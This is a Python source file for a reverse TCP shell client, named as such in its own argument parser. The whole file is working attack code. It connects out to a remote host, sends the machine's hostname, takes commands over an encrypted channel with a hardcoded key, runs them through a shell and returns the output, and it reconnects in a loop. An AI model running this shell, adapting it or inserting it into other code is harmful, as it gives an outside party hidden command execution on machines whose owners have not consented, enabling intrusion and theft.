import argparse
import os
import signal
import socket
import struct
import subprocess
import sys
import time

from cryptography.fernet import Fernet


def command_registrar():
    registry = {}

    def registrar(func):
        registry[func.__name__] = func
        return func
    registrar.all = registry
    return registrar


class Commands:
    command = command_registrar()

    """commands to be loaded into"""
    def __init__(self):
        pass

    @command
    def cd(self, data, *args, **kwargs):
        directory = data[3:].decode('utf-8')
        os.chdir(directory.strip())

    @command
    def hello(self, *args, **kwargs):
        """this prints hello"""
        self.print_output('hello')

    @command
    def background(self, *args, **kwargs):
        """sends client to background"""
        self.socket.close()

    @command
    def help(self, *args, **kwargs):
        """get details on functions to run"""
        commands = self.get_all_commands()
        help_items = ['{0}: {1}'.format(command, func.__doc__) for command, func in commands.items()]
        self.print_output('\n'.join(help_items))

    def get_all_commands(self):
        return self.command.all


class Client(Commands):

    def __init__(self, host, port):
        super().__init__()
        self.server_host = host
        self.server_port = port
        self.socket = None
        self.connection_retry = 5
        self.custom_commands = self.get_all_commands()
        self.encryption_key = b'secretsecretsecretwbsecretsecretsecretsecre='

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)

    def quit_gracefully(self):
        print('Quitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % e)
        sys.exit(0)

    def socket_connect(self):
        try:
            self.socket = socket.socket()
            self.socket.connect((self.server_host, self.server_port))
            self.socket.send(str.encode(socket.gethostname()))
            print('Connection established')

        except socket.error:
            print('Connection failure')
            time.sleep(self.connection_retry)
            self.socket_connect()

    def send(self, output_str, print_output=True):
        sent_message = str.encode(output_str)
        ciphertext_message = self.encrypt(sent_message)
        self.socket.send(struct.pack('>I', len(ciphertext_message)) + ciphertext_message)
        if print_output:
            print(output_str)

    def receive(self):
        ciphertext = self.socket.recv(2048)
        msg = self.decrypt(ciphertext)
        return msg

    def encrypt(self, message):
        f = Fernet(self.encryption_key)
        token = f.encrypt(message)
        return token

    def decrypt(self, ciphertext):
        f = Fernet(self.encryption_key)
        token = f.decrypt(ciphertext)
        return token

    def receive_commands(self):
        self.receive()
        while True:
            try:
                self.send(str(os.getcwd()) + '> ', print_output=False)

                data = self.receive()

                if data == b'':
                    self.send('')
                    break

                command = self.parse_command(data)
                if command == 'cd':
                    directory = data[3:].decode('utf-8')
                    try:
                        os.chdir(directory.strip())
                        self.send('', print_output=False)
                    except:
                        self.send('cd: %s: No such file or directory\n' % directory)
                elif command in self.custom_commands:
                    self.run_custom_command(command, data)
                    if command == 'background':
                        break
                elif len(data) > 0:
                    self.run_command(data)
            except socket.error:
                self.socket_connect()
            except Exception as e:
                time.sleep(self.connection_retry)
                print(e)

        self.socket.close()

    def run_command(self, data):
        cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode('utf-8', errors='replace')
        if output_str is not None:
            self.send(output_str)
        else:
            self.send(' ', print_output=False)

    def run_custom_command(self, command, data):
        command_function = getattr(self, command)
        command_function(data)

    @staticmethod
    def parse_command(data):
        return data.decode('utf-8').partition(' ')[0]


def main():
    parser = argparse.ArgumentParser('A reverse TCP shell')
    parser.add_argument('-H', '--host', required=False, default='0.0.0.0')
    parser.add_argument('-P', '--port', required=False, default=8880)
    args = parser.parse_args()

    client = Client(args.host, args.port)
    while True:
        client.register_signal_handler()
        client.socket_connect()
        client.receive_commands()
        client.socket.close()


if __name__ == '__main__':
    main()
